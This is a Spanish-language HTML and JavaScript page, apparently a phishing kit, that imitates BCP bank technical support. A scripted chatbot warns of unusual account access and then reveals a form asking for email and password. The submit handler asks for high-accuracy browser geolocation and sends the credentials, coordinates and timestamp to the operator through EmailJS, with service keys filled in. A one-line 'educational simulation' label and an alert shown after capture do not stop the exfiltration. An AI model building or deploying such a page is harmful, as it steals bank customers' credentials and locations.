<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BCP: Soporte Técnico</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Custom CSS -->
    <style>
        body {
            background: #f4f6f5; /* Fondo gris claro similar al BCP */
            font-family: 'Helvetica Neue', Arial, sans-serif; /* Tipografía profesional */
            overflow-x: hidden;
        }
        .container-main {
            max-width: 900px;
            margin: 3rem auto;
            padding: 2rem;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            border-top: 5px solid #003087; /* Azul oscuro BCP */
        }
        .logo {
            max-width: 200px;
            margin: 0 auto 1.5rem;
            display: block;
            animation: fadeIn 1s ease-in;
        }
        .chat-box {
            border: 1px solid #d9e0e6; /* Borde gris claro */
            border-radius: 8px;
            padding: 1rem;
            height: 300px;
            overflow-y: auto;
            background: #f9fafb; /* Fondo claro */
            margin-bottom: 1rem;
        }
        .chat-message {
            margin: 0.5rem 0;
            padding: 0.5rem 1rem;
            border-radius: 8px;
        }
        .bot-message {
            background: #e8edf3; /* Tono gris-azul suave */
            margin-left: 2rem;
        }
        .user-message {
            background: #003087; /* Azul BCP */
            color: white;
            margin-right: 2rem;
            text-align: right;
        }
        .form-container {
            animation: slideIn 1s ease-in;
        }
        .btn-primary {
            background-color: #003087; /* Azul BCP */
            border: none;
            transition: transform 0.2s, background-color 0.3s;
        }
        .btn-primary:hover {
            background-color: #00205b; /* Azul más oscuro para hover */
            transform: scale(1.05);
        }
        .form-label {
            color: #003087; /* Azul BCP para etiquetas */
            font-weight: 500;
        }
        .form-control {
            border: 1px solid #d9e0e6;
        }
        .form-control:focus {
            border-color: #003087;
            box-shadow: 0 0 5px rgba(0, 48, 135, 0.3);
        }
        .data-display {
            margin-top: 2rem;
            padding: 1rem;
            background: #e8edf3; /* Fondo gris-azul claro */
            border: 1px solid #d9e0e6;
            border-radius: 8px;
            display: none;
        }
        .success-message {
            color: #28a745; /* Verde para éxito */
            margin-top: 10px;
            text-align: center;
        }
        .error-message {
            color: #dc3545; /* Rojo para error */
            margin-top: 10px;
            text-align: center;
        }
        footer {
            text-align: center;
            margin-top: 3rem;
            color: #4a4a4a;
            font-size: 0.9rem;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes slideIn {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    </style>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        // Inicializar EmailJS con tu Clave Pública
        (function() {
            emailjs.init("bgN-e7F2EjGyDqEfz"); // ¡IMPORTANTE: Reemplaza con tu clave pública real!
        })();
    </script>
</head>
<body>
    <div class="container container-main">
        <img src="img/bcp.png" alt="BCP Logo" class="logo">
        <h2 class="text-center mb-4">Soporte Técnico - Verificación de Cuenta</h2>
        <p class="text-center text-muted mb-4">Simulación de un ataque de spear phishing con interacción de chatbot para fines educativos.</p>

        <div class="chat-box" id="chat-box">
            <div class="chat-message bot-message">¡Hola! Soy el soporte técnico de BCP. Detectamos un acceso inusual a tu cuenta. Por favor, verifica tu identidad.</div>
        </div>
        <div class="input-group mb-3">
            <input type="text" class="form-control" id="chat-input" placeholder="Escribe tu respuesta...">
            <button class="btn btn-primary" type="button" id="send-message">Enviar</button>
        </div>

        <div class="form-container" id="form-container" style="display: none;">
            <h4 class="text-center mb-3">Verifica tu Cuenta</h4>
            <form id="phishing-form">
                <div class="mb-3">
                    <label for="email" class="form-label">Correo Electrónico</label>
                    <input type="email" class="form-control" id="email" placeholder="correo@ejemplo.com" required>
                </div>
                <div class="mb-3">
                    <label for="password" class="form-label">Contraseña</label>
                    <input type="password" class="form-control" id="password" placeholder="********" required>
                </div>
                <button type="submit" class="btn btn-primary w-100" id="submit-button">Verificar</button>
            </form>
            <div id="response-message" class="success-message" style="display: none;"></div>
        </div>

        <div class="data-display" id="data-display">
            <h5>Datos Capturados (Demo):</h5>
            <p id="captured-data">Ningún dato capturado aún.</p>
        </div>
    </div>

    <footer>
        <p>© 2025 Thezero - Entorno Controlado</p>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"></script>
    <script>
        const chatBox = document.getElementById('chat-box');
        const chatInput = document.getElementById('chat-input');
        const sendMessage = document.getElementById('send-message');
        const formContainer = document.getElementById('form-container');
        const phishingForm = document.getElementById('phishing-form');
        const dataDisplay = document.getElementById('data-display');
        const capturedData = document.getElementById('captured-data');
        const responseMessage = document.getElementById('response-message');
        const submitButton = document.getElementById('submit-button'); // Referencia al botón de envío

        let chatStep = 0;

        // Respuestas simuladas del chatbot
        const botResponses = [
            "Por seguridad, necesitamos que ingreses tu correo y contraseña en el formulario que aparecerá a continuación.",
            "Por favor, completa el formulario para restablecer el acceso a tu cuenta."
        ];

        // Manejar la entrada del chat
        sendMessage.addEventListener('click', () => {
            const userMessage = chatInput.value.trim();
            if (userMessage) {
                // Añadir mensaje del usuario al chat
                const userDiv = document.createElement('div');
                userDiv.className = 'chat-message user-message';
                userDiv.textContent = userMessage;
                chatBox.appendChild(userDiv);
                chatBox.scrollTop = chatBox.scrollHeight;

                // Respuesta del bot
                setTimeout(() => {
                    const botDiv = document.createElement('div');
                    botDiv.className = 'chat-message bot-message';
                    botDiv.textContent = botResponses[chatStep] || "Por favor, verifica tu identidad en el formulario.";
                    chatBox.appendChild(botDiv);
                    chatBox.scrollTop = chatBox.scrollHeight;

                    // Mostrar formulario después de la primera interacción
                    if (chatStep === 0) {
                        formContainer.style.display = 'block';
                    }
                    chatStep++;
                }, 1000);

                chatInput.value = '';
            }
        });

        // Manejar el envío del formulario (aquí es donde se integra EmailJS y Geolocalización)
        phishingForm.addEventListener('submit', (e) => {
            e.preventDefault(); // Evitar el envío de formulario por defecto

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Deshabilitar botón y mostrar mensaje de carga
            submitButton.disabled = true;
            submitButton.textContent = 'Verificando ubicación...';

            // ***** Lógica de Geolocalización *****
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Éxito al obtener la ubicación
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        console.log(`Ubicación obtenida: Latitud ${latitude}, Longitud ${longitude}`);
                        sendEmailWithLocation(email, password, latitude, longitude);
                    },
                    (error) => {
                        // Error al obtener la ubicación (usuario denegó, timeout, etc.)
                        console.error('Error al obtener la ubicación:', error);
                        let locationErrorMsg = 'Ubicación no disponible';
                        if (error.code === error.PERMISSION_DENIED) {
                            locationErrorMsg = 'Permiso de ubicación denegado.';
                        } else if (error.code === error.POSITION_UNAVAILABLE) {
                            locationErrorMsg = 'Información de ubicación no disponible.';
                        } else if (error.code === error.TIMEOUT) {
                            locationErrorMsg = 'Tiempo de espera agotado para obtener ubicación.';
                        }
                        sendEmailWithLocation(email, password, locationErrorMsg, locationErrorMsg); // Enviar mensaje de error en lugar de coordenadas
                    },
                    {
                        enableHighAccuracy: true, // Intentar obtener la mejor precisión posible
                        timeout: 10000,           // Tiempo máximo para esperar la ubicación (10 segundos)
                        maximumAge: 0             // No usar una posición en caché
                    }
                );
            } else {
                // Navegador no soporta Geolocation
                console.error('Tu navegador no soporta la API de Geolocalización.');
                sendEmailWithLocation(email, password, 'N/A (Navegador no soporta Geolocation)', 'N/A (Navegador no soporta Geolocation)');
            }
        });

        // Función para enviar el correo con los datos y la ubicación
        function sendEmailWithLocation(email, password, latitude, longitude) {
            const serviceID = 'service_tzzmwxg';   // ID de Servicio de EmailJS
            const templateID = 'template_u6oqb6q'; // ID de Plantilla de EmailJS

            const templateParams = {
                user_email: email,
                user_password: password,
                user_latitude: latitude,   // Nueva variable para latitud
                user_longitude: longitude, // Nueva variable para longitud
                timestamp: new Date().toLocaleString('es-PE', {
                    year: 'numeric', month: 'long', day: 'numeric',
                    hour: '2-digit', minute: '2-digit', second: '2-digit',
                    hour12: false
                }),
                subject: `Datos capturados de ${email}` // Asunto del correo
            };

            emailjs.send(serviceID, templateID, templateParams)
                .then(function(response) {
                    console.log('Correo enviado con éxito!', response.status, response.text);
                    responseMessage.textContent = '¡Verificación completada! Gracias.';
                    responseMessage.className = 'success-message';
                    responseMessage.style.display = 'block';

                    // Mostrar alerta de demostración (se mantiene)
                    alert('¡Atención! Este es un ejemplo de spear phishing. Los datos ingresados han sido capturados y MOSTRADOS en la página (para demostración) y ENVIADOS a través de EmailJS, ¡incluyendo la ubicación!');

                    // Opcional: mostrar los datos capturados en el cuadro de demostración local
                    dataDisplay.style.display = 'block';
                    capturedData.innerHTML = `Correo: ${email}<br>Contraseña: ${password}<br>Latitud: ${latitude}<br>Longitud: ${longitude}`;

                    phishingForm.reset(); // Resetear el formulario
                    submitButton.disabled = false; // Habilitar botón
                    submitButton.textContent = 'Verificar'; // Restaurar texto
                    setTimeout(() => {
                        responseMessage.style.display = 'none';
                        dataDisplay.style.display = 'none'; // Ocultar datos de demo también
                    }, 5000);

                }, function(error) {
                    console.error('Error al enviar el correo:', error);
                    responseMessage.textContent = 'Error en la verificación. Por favor, inténtelo de nuevo.';
                    responseMessage.className = 'error-message';
                    responseMessage.style.display = 'block';

                    // Mostrar alerta de error para fines de demostración
                    alert('Error en la demo: No se pudo enviar el correo via EmailJS. Verifica tu conexión o configuración de EmailJS.');

                    // Mostrar datos capturados localmente como fallback para la demo
                    dataDisplay.style.display = 'block';
                    capturedData.innerHTML = `Correo: ${email}<br>Contraseña: ${password} (Error de envío)<br>Latitud: ${latitude}<br>Longitud: ${longitude}`;

                    submitButton.disabled = false; // Habilitar botón
                    submitButton.textContent = 'Verificar'; // Restaurar texto
                    setTimeout(() => {
                        responseMessage.style.display = 'none';
                        dataDisplay.style.display = 'none'; // Ocultar datos de demo también
                    }, 5000);
                });
        }
    </script>
</body>
</html>